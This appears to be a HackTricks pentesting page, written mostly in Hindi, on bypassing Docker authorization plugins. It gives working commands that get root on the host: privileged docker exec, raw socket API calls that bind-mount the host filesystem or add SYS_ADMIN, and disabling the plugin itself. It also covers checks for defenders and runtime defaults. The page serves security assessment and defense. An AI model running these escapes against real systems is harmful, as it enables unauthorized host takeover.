# Runtime Authorization Plugins

{{#include ../../../banners/hacktricks-training.md}}

## Overview

Runtime authorization plugins एक अतिरिक्त नीति परत हैं जो तय करती है कि कोई caller किसी दिए गए daemon action को कर सकता है या नहीं। Docker इसका क्लासिक उदाहरण है। डिफ़ॉल्ट रूप से, जो कोई भी Docker daemon से बात कर सकता है, उसके पास प्रभावी रूप से उस पर व्यापक नियंत्रण होता है। Authorization plugins उस मॉडल को संकुचित करने की कोशिश करते हैं — वे authenticated user और requested API operation की जांच करते हैं, फिर policy के अनुसार request को allow या deny करते हैं।

यह टॉपिक अपना पेज का हकदार है क्योंकि यह exploitation model को बदल देता है जब हमला करने वाले के पास पहले से Docker API या `docker` group का कोई user access है। ऐसे वातावरण में सवाल केवल "क्या मैं daemon तक पहुँच सकता हूँ?" नहीं रहता, बल्कि "क्या daemon किसी authorization layer से fenced है, और अगर हाँ, तो क्या उस layer को unhandled endpoints, कमजोर JSON parsing, या plugin-management permissions के माध्यम से bypass किया जा सकता है?" भी बन जाता है।

## Operation

जब कोई request Docker daemon तक पहुँचती है, authorization subsystem request context को एक या ज़्यादा installed plugins को पास कर सकता है। plugin authenticated user identity, request details, चुने हुए headers, और request या response body के वे हिस्से देखता है जहाँ content type उपयुक्त होता है। Multiple plugins को chained किया जा सकता है, और access तभी granted होता है जब सभी plugins request को allow करें।

यह मॉडल मजबूत प्रतीत होता है, लेकिन इसकी सुरक्षा पूरी तरह उस पर निर्भर करती है कि policy author ने API को कितनी पूरी तरह समझा। एक plugin जो `docker run --privileged` को block करता है लेकिन `docker exec` को ignore कर देता है, या top-level JSON key जैसे `Binds` को मिस करता है, या plugin administration की अनुमति देता है, एक झूठी प्रतिबंध की भावना पैदा कर सकता है जबकि सीधे privilege-escalation रास्ते खुला छोड़ देता है।

## Common Plugin Targets

नीति समीक्षा के लिए महत्वपूर्ण क्षेत्र हैं:

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- any endpoint that can indirectly trigger runtime actions outside the intended policy model

ऐतिहासिक रूप से, Twistlock के `authz` plugin और शैक्षिक plugins जैसे `authobot` जैसे उदाहरणों ने इस मॉडल का अध्ययन आसान बनाया क्योंकि उनके policy files और code paths दिखाते थे कि endpoint-to-action mapping वास्तव में कैसे लागू किया गया। assessment कार्य में, महत्वपूर्ण सबक यह है कि policy author को केवल सबसे दिखाई देने वाले CLI commands नहीं, बल्कि पूरा API surface समझना चाहिए।

## Abuse

पहला लक्ष्य यह जानना है कि वास्तव में क्या blocked है। यदि daemon किसी क्रिया को deny करता है, तो त्रुटि अक्सर plugin name को leaks करती है, जो उपयोग में आने वाले control की पहचान करने में मदद करता है:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
यदि आपको broader endpoint profiling की आवश्यकता है, तो `docker_auth_profiler` जैसे टूल उपयोगी होते हैं क्योंकि वे अन्यथा बार-बार होने वाले उस काम को ऑटोमेट कर देते हैं — यह चेक करना कि plugin द्वारा वास्तव में कौन से API routes और JSON structures अनुमत हैं।

यदि environment कोई custom plugin उपयोग कर रहा है और आप API के साथ interact कर सकते हैं, तो enumerate करें कि वास्तव में कौन से object fields filter किए जा रहे हैं:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
ये चेक महत्वपूर्ण हैं क्योंकि कई प्राधिकरण संबंधी विफलताएँ क्षेत्र-विशेष होती हैं न कि अवधारणा-विशेष। एक plugin CLI पैटर्न को अस्वीकार कर सकता है बिना समकक्ष API संरचना को पूरी तरह से ब्लॉक किए।

### पूरा उदाहरण: `docker exec` कंटेनर निर्माण के बाद विशेषाधिकार जोड़ता है

एक नीति जो privileged कंटेनर निर्माण को ब्लॉक करती है लेकिन unconfined कंटेनर निर्माण और `docker exec` की अनुमति देती है, तब भी बायपास की जा सकती है:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
यदि daemon दूसरे चरण को स्वीकार कर लेता है, तो उपयोगकर्ता ने उस container के अंदर एक privileged interactive process पुनः प्राप्त कर लिया है जिसे policy author ने constrained माना था।

### पूर्ण उदाहरण: Bind Mount Through Raw API

कुछ broken policies केवल एक JSON shape ही निरीक्षण करती हैं। यदि root filesystem bind mount लगातार ब्लॉक नहीं किया जाता है, तो host फिर भी mount किया जा सकता है:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
वही विचार `HostConfig` के अंतर्गत भी प्रकट हो सकता है:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
प्रभाव यह है कि पूरा होस्ट फ़ाइलसिस्टम एस्केप हो जाता है। दिलचस्प बात यह है कि यह बायपास kernel बग की बजाय अधूरी नीति कवरेज से आता है।

### Full Example: Unchecked Capability Attribute

यदि नीति capability-संबंधित attribute को फ़िल्टर करना भूल जाती है, तो हमलावर एक container बना सकता है जो एक खतरनाक capability फिर से प्राप्त कर ले:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
एक बार `CAP_SYS_ADMIN` या एक समान रूप से मजबूत capability मौजूद होने पर, [capabilities.md](protections/capabilities.md) और [privileged-containers.md](privileged-containers.md) में वर्णित कई breakout techniques पहुँच योग्य हो जाते हैं।

### पूरा उदाहरण: प्लगइन अक्षम करना

यदि plugin-management operations की अनुमति है, तो सबसे साफ़ bypass यह हो सकता है कि नियंत्रण को पूरी तरह से बंद कर दिया जाए:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
यह कंट्रोल-प्लेन स्तर पर एक नीति विफलता है। प्राधिकरण परत मौजूद है, लेकिन जिसे यह प्रतिबंधित करना था वह उपयोगकर्ता अभी भी इसे अक्षम करने की अनुमति रखता है।

## Checks

ये कमांड यह पहचानने के लिए हैं कि क्या कोई नीति परत मौजूद है और क्या वह पूर्ण है या सतही।
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
What is interesting here:

- Denial messages that include a plugin name confirm an authorization layer and often reveal the exact implementation.
- A plugin list visible to the attacker may be enough to discover whether disable or reconfigure operations are possible.
- A policy that blocks only obvious CLI actions but not raw API requests should be treated as bypassable until proven otherwise.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | डिफ़ॉल्ट रूप से सक्षम नहीं | Daemon access सामान्यतः या-तो-सब-या-कुछ भी नहीं होता है जब तक कोई authorization plugin कॉन्फ़िगर न किया गया हो | incomplete plugin policy, blacklists instead of allowlists, allowing plugin management, field-level blind spots |
| Podman | प्रचलित सीधे समकक्ष नहीं | Podman आम तौर पर Docker-style authz plugins की तुलना में अधिक Unix permissions, rootless execution, और API exposure निर्णयों पर निर्भर करता है | exposing a rootful Podman API broadly, weak socket permissions |
| containerd / CRI-O | अलग नियंत्रण मॉडल | ये runtimes आमतौर पर Docker authz plugins की बजाय socket permissions, node trust boundaries, और higher-layer orchestrator controls पर निर्भर करते हैं | mounting the socket into workloads, weak node-local trust assumptions |
| Kubernetes | API-server और kubelet लेयर्स पर authn/authz का उपयोग, न कि Docker authz plugins | Cluster RBAC और admission controls मुख्य policy लेयर हैं | overbroad RBAC, weak admission policy, exposing kubelet or runtime APIs directly |
{{#include ../../../banners/hacktricks-training.md}}
